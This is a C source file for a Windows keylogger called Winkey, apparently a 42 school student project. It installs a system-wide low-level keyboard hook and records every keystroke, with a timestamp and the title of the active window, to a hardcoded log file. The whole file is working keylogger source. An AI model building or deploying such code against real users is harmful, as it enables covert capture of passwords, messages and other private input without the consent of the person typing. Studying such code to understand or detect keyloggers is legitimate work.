/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winkey.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: emaugale <emaugale@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/03/29 22:40:28 by emaugale          #+#    #+#             */
/*   Updated: 2023/03/29 22:52:46 by emaugale         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define WINDOW_CLASS_NAME L"Winkey Window Class"
#include <windows.h>
#include <stdio.h>
#include <Share.h>
#pragma comment(lib, "user32.lib")
#pragma warning(disable: 5045)

#include "error.c"

#define LOG_PATH "C:\\Users\\Zekao\\Documents\\log.txt"

// This keyboard hook needs to remain global because we will reuse it within the hook callback.
HHOOK keyboard_hook = NULL; 

// The handle to the window created to received keyboard messages.
HWND hwnd = NULL;  // The handle to the window created to received keyboard messages.

char const *key_saved = NULL;

FILE *file;

static inline size_t to_utf8(wchar_t const *utf16, size_t utf16_len, char *utf8, size_t utf8_len)
{
    /**
     * Converts an UTF-16 buffer into an UTF-8 buffer.
     */
    
    return (size_t)WideCharToMultiByte(CP_UTF8, 0, utf16, (int)utf16_len, utf8, (int)utf8_len, NULL, NULL);
}

static void log_key(char const *key, char const *c)
{
    /**
     * Logs a key.
     */

    if (!key)
        key = "[UNKNOWN]";
    
    if (!c)
        c = "";

    // Query the current timestamp.

    SYSTEMTIME system_time;
    GetLocalTime(&system_time);

    // Query the name of the top-level window.
    
    wchar_t window_title_utf16[128];
    char window_title_utf8[256] = "unknown";

    HWND forground_hwnd = GetForegroundWindow();

    if (forground_hwnd)
    {
        int count_utf16 = GetWindowTextW(forground_hwnd, window_title_utf16, 128);
        if (count_utf16 != 0)
        {
            int count_utf8 = (int)to_utf8(window_title_utf16, count_utf16, window_title_utf8, 255);
            if (count_utf8 == 0)
                strcpy(window_title_utf8, "unknown");
            else
                window_title_utf8[count_utf8] = '\0';
        }
    }

    fprintf(
        file,
        "[%02d:%02d:%02d.%03d] <%s> => %s %s\n",
        system_time.wHour, system_time.wMinute,
        system_time.wSecond, system_time.wMilliseconds,
        window_title_utf8, key, c);
    fflush(file);
}

static void received_character(wchar_t *utf16, size_t utf16_len)
{
    /**
     * This function is called when a new character is received.
     * The character is encoded in UTF-16.
     *
     * This function assumes that `utf16_len` is less or equal to 2.
     */
    
    char utf8[5];
    
    // Convert the characters into UTF-8.
    int count = (int)to_utf8(utf16, utf16_len, utf8, 4);
    if (count == 0)
        return;

    utf8[count] = '\0';

    // Filter some unwanted characters.
    // Specifically: control characters should not be displayed.

    if (count == 1 && utf8[0] <= 32)
        return;

    // Save the character.

    log_key(key_saved, utf8);
    key_saved = NULL;
}

static char const *get_key_name(USHORT vk)
{
    switch (vk) {
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_CLEAR: return "[CLEAR]";
        case VK_RETURN: return "[RETURN]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CONTROL]";
        case VK_MENU: return "[MENU]";
        case VK_PAUSE: return "[PAUSE]";
        case VK_CAPITAL: return "[CAPITAL]";
        case VK_KANA: return "[KANA]";
        case VK_IME_ON: return "[IME_ON]";
        case VK_JUNJA: return "[JUNJA]";
        case VK_FINAL: return "[FINAL]";
        case VK_KANJI: return "[KANJI]";
        case VK_IME_OFF: return "[IME_OFF]";
        case VK_ESCAPE: return "[ESCAPE]";
        case VK_CONVERT: return "[CONVERT]";
        case VK_NONCONVERT: return "[NONCONVERT]";
        case VK_ACCEPT: return "[ACCEPT]";
        case VK_MODECHANGE: return "[MODECHANGE]";
        case VK_SPACE: return "[SPACE]";
        case VK_PRIOR: return "[PRIOR]";
        case VK_NEXT: return "[NEXT]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DOWN: return "[DOWN]";
        case VK_SELECT: return "[SELECT]";
        case VK_PRINT: return "[PRINT]";
        case VK_EXECUTE: return "[EXECUTE]";
        case VK_SNAPSHOT: return "[SNAPSHOT]";
        case VK_INSERT: return "[INSERT]";
        case VK_DELETE: return "[DELETE]";
        case VK_HELP: return "[HELP]";
        case VK_LWIN: return "[LWIN]";
        case VK_RWIN: return "[RWIN]";
        case VK_APPS: return "[APPS]";
        case VK_SLEEP: return "[SLEEP]";
        case VK_NUMPAD0: return "[NUMPAD0]";
        case VK_NUMPAD1: return "[NUMPAD1]";
        case VK_NUMPAD2: return "[NUMPAD2]";
        case VK_NUMPAD3: return "[NUMPAD3]";
        case VK_NUMPAD4: return "[NUMPAD4]";
        case VK_NUMPAD5: return "[NUMPAD5]";
        case VK_NUMPAD6: return "[NUMPAD6]";
        case VK_NUMPAD7: return "[NUMPAD7]";
        case VK_NUMPAD8: return "[NUMPAD8]";
        case VK_NUMPAD9: return "[NUMPAD9]";
        case VK_MULTIPLY: return "[MULTIPLY]";
        case VK_ADD: return "[ADD]";
        case VK_SEPARATOR: return "[SEPARATOR]";
        case VK_SUBTRACT: return "[SUBTRACT]";
        case VK_DECIMAL: return "[DECIMAL]";
        case VK_DIVIDE: return "[DIVIDE]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        case VK_F13: return "[F13]";
        case VK_F14: return "[F14]";
        case VK_F15: return "[F15]";
        case VK_F16: return "[F16]";
        case VK_F17: return "[F17]";
        case VK_F18: return "[F18]";
        case VK_F19: return "[F19]";
        case VK_F20: return "[F20]";
        case VK_F21: return "[F21]";
        case VK_F22: return "[F22]";
        case VK_F23: return "[F23]";
        case VK_F24: return "[F24]";
#if _WIN32_WINNT >= 0x0604
        case VK_NAVIGATION_VIEW: return "[NAVIGATION_VIEW]";
        case VK_NAVIGATION_MENU: return "[NAVIGATION_MENU]";
        case VK_NAVIGATION_UP: return "[NAVIGATION_UP]";
        case VK_NAVIGATION_DOWN: return "[NAVIGATION_DOWN]";
        case VK_NAVIGATION_LEFT: return "[NAVIGATION_LEFT]";
        case VK_NAVIGATION_RIGHT: return "[NAVIGATION_RIGHT]";
        case VK_NAVIGATION_ACCEPT: return "[NAVIGATION_ACCEPT]";
        case VK_NAVIGATION_CANCEL: return "[NAVIGATION_CANCEL]";
#endif /* _WIN32_WINNT >= 0x0604 */
        case VK_NUMLOCK: return "[NUMLOCK]";
        case VK_SCROLL: return "[SCROLL]";
        case VK_OEM_NEC_EQUAL: return "[OEM_NEC_EQUAL]";
        case VK_OEM_FJ_MASSHOU: return "[OEM_FJ_MASSHOU]";
        case VK_OEM_FJ_TOUROKU: return "[OEM_FJ_TOUROKU]";
        case VK_OEM_FJ_LOYA: return "[OEM_FJ_LOYA]";
        case VK_OEM_FJ_ROYA: return "[OEM_FJ_ROYA]";
        case VK_LSHIFT: return "[LSHIFT]";
        case VK_RSHIFT: return "[RSHIFT]";
        case VK_LCONTROL: return "[LCONTROL]";
        case VK_RCONTROL: return "[RCONTROL]";
        case VK_LMENU: return "[LMENU]";
        case VK_RMENU: return "[RMENU]";
        case VK_BROWSER_BACK: return "[BROWSER_BACK]";
        case VK_BROWSER_FORWARD: return "[BROWSER_FORWARD]";
        case VK_BROWSER_REFRESH: return "[BROWSER_REFRESH]";
        case VK_BROWSER_STOP: return "[BROWSER_STOP]";
        case VK_BROWSER_SEARCH: return "[BROWSER_SEARCH]";
        case VK_BROWSER_FAVORITES: return "[BROWSER_FAVORITES]";
        case VK_BROWSER_HOME: return "[BROWSER_HOME]";
        case VK_VOLUME_MUTE: return "[VOLUME_MUTE]";
        case VK_VOLUME_DOWN: return "[VOLUME_DOWN]";
        case VK_VOLUME_UP: return "[VOLUME_UP]";
        case VK_MEDIA_NEXT_TRACK: return "[MEDIA_NEXT_TRACK]";
        case VK_MEDIA_PREV_TRACK: return "[MEDIA_PREV_TRACK]";
        case VK_MEDIA_STOP: return "[MEDIA_STOP]";
        case VK_MEDIA_PLAY_PAUSE: return "[MEDIA_PLAY_PAUSE]";
        case VK_LAUNCH_MAIL: return "[LAUNCH_MAIL]";
        case VK_LAUNCH_MEDIA_SELECT: return "[LAUNCH_MEDIA_SELECT]";
        case VK_LAUNCH_APP1: return "[LAUNCH_APP1]";
        case VK_LAUNCH_APP2: return "[LAUNCH_APP2]";
        case VK_OEM_1: return "[OEM_1]";
        case VK_OEM_PLUS: return "[OEM_PLUS]";
        case VK_OEM_COMMA: return "[OEM_COMMA]";
        case VK_OEM_MINUS: return "[OEM_MINUS]";
        case VK_OEM_PERIOD: return "[OEM_PERIOD]";
        case VK_OEM_2: return "[OEM_2]";
        case VK_OEM_3: return "[OEM_3]";
#if _WIN32_WINNT >= 0x0604
        case VK_GAMEPAD_A: return "[GAMEPAD_A]";
        case VK_GAMEPAD_B: return "[GAMEPAD_B]";
        case VK_GAMEPAD_X: return "[GAMEPAD_X]";
        case VK_GAMEPAD_Y: return "[GAMEPAD_Y]";
        case VK_GAMEPAD_RIGHT_SHOULDER: return "[GAMEPAD_RIGHT_SHOULDER]";
        case VK_GAMEPAD_LEFT_SHOULDER: return "[GAMEPAD_LEFT_SHOULDER]";
        case VK_GAMEPAD_LEFT_TRIGGER: return "[GAMEPAD_LEFT_TRIGGER]";
        case VK_GAMEPAD_RIGHT_TRIGGER: return "[GAMEPAD_RIGHT_TRIGGER]";
        case VK_GAMEPAD_DPAD_UP: return "[GAMEPAD_DPAD_UP]";
        case VK_GAMEPAD_DPAD_DOWN: return "[GAMEPAD_DPAD_DOWN]";
        case VK_GAMEPAD_DPAD_LEFT: return "[GAMEPAD_DPAD_LEFT]";
        case VK_GAMEPAD_DPAD_RIGHT: return "[GAMEPAD_DPAD_RIGHT]";
        case VK_GAMEPAD_MENU: return "[GAMEPAD_MENU]";
        case VK_GAMEPAD_VIEW: return "[GAMEPAD_VIEW]";
        case VK_GAMEPAD_LEFT_THUMBSTICK_BUTTON: return "[GAMEPAD_LEFT_THUMBSTICK_BUTTON]";
        case VK_GAMEPAD_RIGHT_THUMBSTICK_BUTTON: return "[GAMEPAD_RIGHT_THUMBSTICK_BUTTON]";
        case VK_GAMEPAD_LEFT_THUMBSTICK_UP: return "[GAMEPAD_LEFT_THUMBSTICK_UP]";
        case VK_GAMEPAD_LEFT_THUMBSTICK_DOWN: return "[GAMEPAD_LEFT_THUMBSTICK_DOWN]";
        case VK_GAMEPAD_LEFT_THUMBSTICK_RIGHT: return "[GAMEPAD_LEFT_THUMBSTICK_RIGHT]";
        case VK_GAMEPAD_LEFT_THUMBSTICK_LEFT: return "[GAMEPAD_LEFT_THUMBSTICK_LEFT]";
        case VK_GAMEPAD_RIGHT_THUMBSTICK_UP: return "[GAMEPAD_RIGHT_THUMBSTICK_UP]";
        case VK_GAMEPAD_RIGHT_THUMBSTICK_DOWN: return "[GAMEPAD_RIGHT_THUMBSTICK_DOWN]";
        case VK_GAMEPAD_RIGHT_THUMBSTICK_RIGHT: return "[GAMEPAD_RIGHT_THUMBSTICK_RIGHT]";
        case VK_GAMEPAD_RIGHT_THUMBSTICK_LEFT: return "[GAMEPAD_RIGHT_THUMBSTICK_LEFT]";
#endif /* _WIN32_WINNT >= 0x0604 */
        case VK_OEM_4: return "[OEM_4]";
        case VK_OEM_5: return "[OEM_5]";
        case VK_OEM_6: return "[OEM_6]";
        case VK_OEM_7: return "[OEM_7]";
        case VK_OEM_8: return "[OEM_8]";
        case VK_OEM_AX: return "[OEM_AX]";
        case VK_OEM_102: return "[OEM_102]";
        case VK_ICO_HELP: return "[ICO_HELP]";
        case VK_ICO_00: return "[ICO_00]";
        case VK_PROCESSKEY: return "[PROCESSKEY]";
        case VK_ICO_CLEAR: return "[ICO_CLEAR]";
        case VK_PACKET: return "[PACKET]";
        case VK_OEM_RESET: return "[OEM_RESET]";
        case VK_OEM_JUMP: return "[OEM_JUMP]";
        case VK_OEM_PA1: return "[OEM_PA1]";
        case VK_OEM_PA2: return "[OEM_PA2]";
        case VK_OEM_PA3: return "[OEM_PA3]";
        case VK_OEM_WSCTRL: return "[OEM_WSCTRL]";
        case VK_OEM_CUSEL: return "[OEM_CUSEL]";
        case VK_OEM_ATTN: return "[OEM_ATTN]";
        case VK_OEM_FINISH: return "[OEM_FINISH]";
        case VK_OEM_COPY: return "[OEM_COPY]";
        case VK_OEM_AUTO: return "[OEM_AUTO]";
        case VK_OEM_ENLW: return "[OEM_ENLW]";
        case VK_OEM_BACKTAB: return "[OEM_BACKTAB]";
        case VK_ATTN: return "[ATTN]";
        case VK_CRSEL: return "[CRSEL]";
        case VK_EXSEL: return "[EXSEL]";
        case VK_EREOF: return "[EREOF]";
        case VK_PLAY: return "[PLAY]";
        case VK_ZOOM: return "[ZOOM]";
        case VK_NONAME: return "[NONAME]";
        case VK_PA1: return "[PA1]";
        case VK_OEM_CLEAR: return "[OEM_CLEAR]";
        case 'A': return "[A]";
        case 'B': return "[B]";
        case 'C': return "[C]";
        case 'D': return "[D]";
        case 'E': return "[E]";
        case 'F': return "[F]";
        case 'G': return "[G]";
        case 'H': return "[H]";
        case 'I': return "[I]";
        case 'J': return "[J]";
        case 'K': return "[K]";
        case 'L': return "[L]";
        case 'M': return "[M]";
        case 'N': return "[N]";
        case 'O': return "[O]";
        case 'P': return "[P]";
        case 'Q': return "[Q]";
        case 'R': return "[R]";
        case 'S': return "[S]";
        case 'T': return "[T]";
        case 'U': return "[U]";
        case 'V': return "[V]";
        case 'W': return "[W]";
        case 'X': return "[X]";
        case 'Y': return "[Y]";
        case 'Z': return "[Z]";
        case '0': return "[0]";
        case '1': return "[1]";
        case '2': return "[2]";
        case '3': return "[3]";
        case '4': return "[4]";
        case '5': return "[5]";
        case '6': return "[6]";
        case '7': return "[7]";
        case '8': return "[8]";
        case '9': return "[9]";
        default: return NULL;
    }
}

static LRESULT CALLBACK wndproc(HWND hwnd_, UINT msg, WPARAM wparam, LPARAM lparam)
{
    /**
     * This callback is called by the windows message loop every time a
     * a message has to be handled.
     */

    // We need to keep track of an eventual previous low surrogate.
    // 0 indicates no value.
    static wchar_t low_surrogate = 0;
    
    switch (msg)
    {
        case WM_CHAR:
        case WM_SYSCHAR:
            wchar_t character_code = (wchar_t)wparam;

            if (IS_LOW_SURROGATE(character_code))
                low_surrogate = character_code;
            else if (low_surrogate != 0)
            {
                if (IS_SURROGATE_PAIR(character_code, low_surrogate))
                {
                    wchar_t buf[2] = {character_code, low_surrogate};
                    received_character(buf, 2);
                }

                low_surrogate = 0;
            }
            else
            {
                received_character(&character_code, 1);
                low_surrogate = 0;
            }

            return 0;
        default:
            return DefWindowProcW(hwnd_, msg, wparam, lparam);
    }
}

LRESULT CALLBACK hookproc(int code, WPARAM wparam, LPARAM lparam)
{
    if (code < 0)
        return CallNextHookEx(keyboard_hook, code, wparam, lparam);

    KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lparam;

    if (wparam != WM_KEYDOWN && wparam != WM_SYSKEYDOWN)
        return 0;


    key_saved = get_key_name((USHORT)info->vkCode);

    PostMessageW(hwnd, (UINT)wparam, info->vkCode, 0);

    return 0;
}

int main(void)
{
    file = _fsopen(LOG_PATH, "a+", _SH_DENYNO);
    if (!file)
    {
        print_last_error("Failed to open the log file");
        return 1;
    }

    HINSTANCE hinstance = GetModuleHandleW(NULL);

    if (!hinstance)
    {
        print_last_error("GetModuleHandle");
        return 1;
    }

    // Register the window class.
    // We need a window class in order to create a window in the first place.

    
    WNDCLASSEXW class_info;
    ZeroMemory(&class_info, sizeof(class_info));
    class_info.cbSize = sizeof(class_info);
    class_info.hInstance = hinstance;
    class_info.lpfnWndProc = (WNDPROC) wndproc;
    class_info.lpszClassName = WINDOW_CLASS_NAME;

    ATOM class_atom = RegisterClassExW(&class_info);
    if (!class_atom)
    {
        print_last_error("RegisterClass");
        return 1;
    }

    // Create a new window.

    hwnd = CreateWindowExW(
        0,
        WINDOW_CLASS_NAME,
        L"Winkey",
        0,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        HWND_MESSAGE,
        NULL,
        hinstance,
        NULL);

    if (!hwnd)
    {
        print_last_error("CreateWindow");
        return 1;
    }

    // Create a keyboard hook.
    // It will be responsible for sending key events to the window.
    
    keyboard_hook = SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)hookproc, hinstance, 0);
    if (!keyboard_hook)
    {
        print_last_error("SetWindowsHook");
        return 1;
    }

    // Start the event loop.

    MSG msg;
    while (GetMessageW(&msg, hwnd, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);

        if (PeekMessageW(&msg, hwnd, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        if (key_saved) {
            log_key(key_saved, NULL);
        }
    }
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance;
    (void)hPrevInstance;
    (void)lpCmdLine;
    (void)nCmdShow;
    main();

    return 0;
}